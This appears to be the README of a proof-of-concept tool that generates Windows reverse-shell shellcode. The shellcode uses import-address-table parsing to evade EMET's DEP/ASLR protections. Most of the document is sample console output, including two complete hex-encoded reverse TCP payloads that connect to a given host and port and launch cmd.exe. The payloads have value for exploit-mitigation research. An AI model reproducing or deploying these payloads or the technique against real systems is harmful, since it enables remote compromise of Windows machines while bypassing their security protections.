# IAT_POC

Find a suitable IAT based payload, that bypasses post DEP/ASLR protectsion in EMET. 


### Dependencies
```
python2.7
pefile
```

# Warning
*There is no exit function, you'll get a cmd shell back, but there will be a crash.  This was done by design - write your own exit function.*

### Examples:

```
$ ./iat_poc.py                                     
IAT parser reverse tcp payload generator
ಠ_ಠ
Usage: ./iat_poc.py PE_BINARY HOST PORT Operating_System_(winXP, winVista, win7, win8, win10) Force_EMET_HASH_(True/False) Force_Loaded_module_(True/False)

$./iat_poc.py handle.exe 127.0.0.1 8080 win10 True False
[*] Loading PE in pefile
[*] Parsing data directories
[*] Found API getprocaddress
[*] GetProcAddress API was found!
[*] DLLs in the import table: set(['COMDLG32.dll', 'VERSION.dll', 'GDI32.dll', 'KERNEL32.dll', 'ADVAPI32.dll', 'USER32.dll'])
[*] Using GPA IAT parsing stub
[*] Payload length: 489
"\xfc\x31\xd2\x64\x8b\x52\x30\x8b\x52\x08\x8b\xda\x03\x52\x3c\x8b\xba\x80\x00\x00\x00\x03\xfb\x8b\x57\x0c\x03\xd3\x81\x3a\x4b\x45\x52\x4e\x74\x05\x83\xc7\x14\xeb\xee\x57\xeb\x3e\x8b\x57\x10\x03\xd3\x8b\x37\x03\xf3\x8b\xca\x81\xc1\x00\x00\xff\x00\x33\xed\x8b\x06\x03\xc3\x83\xc0\x02\x3b\xc8\x72\x18\x3b\xc2\x72\x14\x3e\x8b\x7c\x24\x04\x39\x38\x75\x0b\x3e\x8b\x7c\x24\x08\x39\x78\x08\x75\x01\xc3\x83\xc5\x04\x83\xc6\x04\xeb\xd5\x68\x64\x64\x72\x65\x68\x47\x65\x74\x50\xe8\xb3\xff\xff\xff\x03\xd5\x5d\x5d\x8b\xca\x89\xcd\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x6a\x18\x59\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x81\xff\x5b\xbc\x4a\x6a\x8b\x5a\x10\x8b\x12\x75\xdb\x6a\x00\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\x89\xe9\xff\x11\x50\x89\xe3\x87\xcd\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x87\xf1\xff\x13\x68\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50\x97\xff\x16\x95\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\xff\xd5\x68\x74\x41\x00\x00\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x54\x57\xff\x16\x95\x31\xc0\x50\x50\x50\x50\x40\x50\x40\x50\xff\xd5\x95\x68\x65\x63\x74\x00\x68\x63\x6f\x6e\x6e\x54\x57\xff\x16\x87\xcd\x95\x6a\x05\x68\x7f\x00\x00\x01\x68\x02\x00\x1f\x90\x89\xe2\x6a\x10\x52\x51\x87\xf9\xff\xd5\x85\xc0\x74\x00\x6a\x00\x68\x65\x6c\x33\x32\x68\x6b\x65\x72\x6e\x54\xff\x13\x68\x73\x41\x00\x00\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x50\xff\x16\x95\x93\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x87\xfe\x92\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x87\xda\xff\xd5\x89\xe6\x6a\x00\x68\x65\x6c\x33\x32\x68\x6b\x65\x72\x6e\x54\xff\x13\x68\x65\x63\x74\x00\x68\x65\x4f\x62\x6a\x68\x69\x6e\x67\x6c\x68\x46\x6f\x72\x53\x68\x57\x61\x69\x74\x54\x50\x95\xff\x17\x95\x89\xf2\x31\xf6\x4e\x90\x46\x89\xd4\xff\x32\x96\xff\xd5\x81\xc4\x34\x02\x00\x00"
Writing payload to shellcode_output.bin

$ ./iat_poc.py handle.exe 127.0.0.1 8080 win10 True True 
[*] Loading PE in pefile
[*] Parsing data directories
[*] Found API getprocaddress
[*] GetProcAddress API was found!
[*] DLLs in the import table: set(['COMDLG32.dll', 'VERSION.dll', 'GDI32.dll', 'KERNEL32.dll', 'ADVAPI32.dll', 'USER32.dll'])
[*] Checking win10 compatibility
[*] Number of lookups to do: 52270
 [*] Checking for its imported DLLs: COMDLG32.dll
	[*] COMDLG32.dll adds the following not already loaded dll: msvcrt.dll
	[*] COMDLG32.dll adds the following not already loaded dll: ntdll.dll
	[*] COMDLG32.dll adds the following not already loaded dll: SHLWAPI.dll
	[*] COMDLG32.dll adds the following not already loaded dll: COMCTL32.dll
	[*] COMDLG32.dll adds the following not already loaded dll: SHELL32.dll
	[*] COMDLG32.dll adds the following not already loaded dll: FirewallAPI.dll
	[*] COMDLG32.dll adds the following not already loaded dll: NETAPI32.dll
 [*] Checking for its imported DLLs: emet.dll
 [*] Checking for its imported DLLs: VERSION.dll
	[*] VERSION.dll adds the following not already loaded dll: KERNELBASE.dll
 [*] Checking for its imported DLLs: GDI32.dll
 [*] Checking for its imported DLLs: KERNEL32.dll
 [*] Checking for its imported DLLs: ADVAPI32.dll
	[*] ADVAPI32.dll adds the following not already loaded dll: SECHOST.dll
	[*] ADVAPI32.dll adds the following not already loaded dll: RPCRT4.dll
 [*] Checking for its imported DLLs: USER32.dll
 [*] Checking for its imported DLLs: COMDLG32.dll
 [*] Checking for its imported DLLs: KERNEL32.dll
 [*] Checking for its imported DLLs: msvcrt.dll
 [*] Checking for its imported DLLs: NETAPI32.dll
 [*] Checking for its imported DLLs: ntdll.dll
 [*] Checking for its imported DLLs: SHELL32.dll
 [*] Checking for its imported DLLs: RPCRT4.dll
	[*] RPCRT4.dll adds the following not already loaded dll: SspiCli.dll
 [*] Checking for its imported DLLs: COMCTL32.dll
 [*] Checking for its imported DLLs: FirewallAPI.dll
 [*] Checking for its imported DLLs: emet.dll
 [*] Checking for its imported DLLs: KERNELBASE.dll
 [*] Checking for its imported DLLs: VERSION.dll
 [*] Checking for its imported DLLs: GDI32.dll
 [*] Checking for its imported DLLs: ADVAPI32.dll
 [*] Checking for its imported DLLs: SHLWAPI.dll
 [*] Checking for its imported DLLs: SECHOST.dll
 [*] Checking for its imported DLLs: USER32.dll
[*] Parsing imported dlls complete
[*] Possible useful loaded modules: set(['COMDLG32.dll', 'KERNEL32.dll', u'msvcrt.dll', u'NETAPI32.dll', u'RPCRT4.dll', u'SHELL32.dll', u'ntdll.dll', u'COMCTL32.dll', u'FirewallAPI.dll', 'emet.dll', u'KERNELBASE.dll', 'VERSION.dll', 'GDI32.dll', u'SspiCli.dll', 'ADVAPI32.dll', u'SHLWAPI.dll', u'SECHOST.dll', 'USER32.dll'])
[*] Looking for loadliba/getprocaddr or just getprocaddr in COMDLG32.dll
	-- GetProcAddress will work with this imported DLL: c:\\Windows\System32\comdlg32.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in KERNEL32.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in msvcrt.dll
	-- GetProcAddress will work with this imported DLL: c:\\Windows\System32\msvcrt.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in NETAPI32.dll
	-- GetProcAddress will work with this imported DLL: c:\\Windows\System32\netapi32.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in RPCRT4.dll
	-- GetProcAddress will work with this imported DLL: c:\\Windows\System32\rpcrt4.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in SHELL32.dll
	-- GetProcAddress will work with this imported DLL: c:\\Windows\System32\shell32.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in ntdll.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in COMCTL32.dll
	-- GetProcAddress will work with this imported DLL: c:\\Windows\System32\comctl32.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in FirewallAPI.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in emet.dll
	-- GetProcAddress will work with this imported DLL: c:\\Program Files (x86)\EMET 5.5\EMET.dll
	-- This imported DLL will work for LLA/GPA: c:\\Program Files (x86)\EMET 5.5\EMET.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in KERNELBASE.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in VERSION.dll
	-- GetProcAddress will work with this imported DLL: c:\\Windows\System32\version.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in GDI32.dll
	-- GetProcAddress will work with this imported DLL: c:\\Windows\System32\gdi32.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in SspiCli.dll
	-- GetProcAddress will work with this imported DLL: c:\\Windows\System32\sspicli.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in ADVAPI32.dll
	-- GetProcAddress will work with this imported DLL: c:\\Windows\System32\advapi32.dll
	-- This imported DLL will work for LLA/GPA: c:\\Windows\System32\advapi32.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in SHLWAPI.dll
	-- GetProcAddress will work with this imported DLL: c:\\Windows\System32\shlwapi.dll
	-- This imported DLL will work for LLA/GPA: c:\\Windows\System32\shlwapi.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in SECHOST.dll
	-- GetProcAddress will work with this imported DLL: c:\\Windows\System32\sechost.dll
[*] Looking for loadliba/getprocaddr or just getprocaddr in USER32.dll
	-- GetProcAddress will work with this imported DLL: c:\\Windows\System32\user32.dll
[*] LLA/GPA binaries available: {u'advapi32.dll': 3347727348, u'shlwapi.dll': 3944223590, u'emet.dll': 3949030565}
[*] GPA binaries available: {u'comdlg32.dll': 1188016652, u'sspicli.dll': 689806071, u'emet.dll': 3949030565, u'version.dll': 3942686535, u'gdi32.dll': 1619852574, u'advapi32.dll': 3347727348, u'msvcrt.dll': 1948800968, u'netapi32.dll': 3375022068, u'shell32.dll': 1013581072, u'rpcrt4.dll': 2764485184, u'shlwapi.dll': 3944223590, u'sechost.dll': 2896986352, u'user32.dll': 2217227836, u'comctl32.dll': 1229959685}
********************************************************************************
[*] Setting imported IAT GPA payload
[!] Using GPA DLL and hash comdlg32.dll 0x46cfb20c
[*] HASH 0x46cfb20c
[*] Payload length: 543
"\x90\xfc\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x6a\x18\x59\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x81\xff\x0c\xb2\xcf\x46\x8b\x5a\x10\x8b\x12\x75\xdb\x90\x90\x90\x89\xda\x03\x52\x3c\x8b\xba\x80\x00\x00\x00\x01\xdf\x90\x90\x8b\x57\x0c\x01\xda\x81\x3a\x4b\x45\x52\x4e\x81\x7a\x04\x45\x4c\x33\x32\x74\x05\x83\xc7\x14\xeb\xe5\x57\xeb\x3d\x90\x90\x8b\x57\x10\x01\xda\x8b\x37\x01\xde\x89\xd1\x81\xc1\x00\x00\xff\x00\x31\xed\x90\x90\x8b\x06\x01\xd8\x83\xc0\x02\x39\xc1\x72\x13\x8b\x7c\x24\x04\x39\x38\x75\x0b\x3e\x8b\x7c\x24\x08\x39\x78\x08\x75\x01\xc3\x83\xc5\x04\x83\xc6\x04\xeb\xd8\x90\x90\x68\x64\x64\x72\x65\x68\x47\x65\x74\x50\xe8\xb3\xff\xff\xff\x03\xd5\x5d\x5d\x8b\xca\x89\xcd\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x6a\x18\x59\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x81\xff\x5b\xbc\x4a\x6a\x8b\x5a\x10\x8b\x12\x75\xdb\x6a\x00\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\x89\xe9\xff\x11\x50\x89\xe3\x87\xcd\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x87\xf1\xff\x13\x68\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50\x97\xff\x16\x95\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\xff\xd5\x68\x74\x41\x00\x00\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x54\x57\xff\x16\x95\x31\xc0\x50\x50\x50\x50\x40\x50\x40\x50\xff\xd5\x95\x68\x65\x63\x74\x00\x68\x63\x6f\x6e\x6e\x54\x57\xff\x16\x87\xcd\x95\x6a\x05\x68\x7f\x00\x00\x01\x68\x02\x00\x1f\x90\x89\xe2\x6a\x10\x52\x51\x87\xf9\xff\xd5\x85\xc0\x74\x00\x6a\x00\x68\x65\x6c\x33\x32\x68\x6b\x65\x72\x6e\x54\xff\x13\x68\x73\x41\x00\x00\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x50\xff\x16\x95\x93\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x87\xfe\x92\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x87\xda\xff\xd5\x89\xe6\x6a\x00\x68\x65\x6c\x33\x32\x68\x6b\x65\x72\x6e\x54\xff\x13\x68\x65\x63\x74\x00\x68\x65\x4f\x62\x6a\x68\x69\x6e\x67\x6c\x68\x46\x6f\x72\x53\x68\x57\x61\x69\x74\x54\x50\x95\xff\x17\x95\x89\xf2\x31\xf6\x4e\x90\x46\x89\xd4\xff\x32\x96\xff\xd5\x81\xc4\x34\x02\x00\x00"
Writing payload to shellcode_output.bin
```
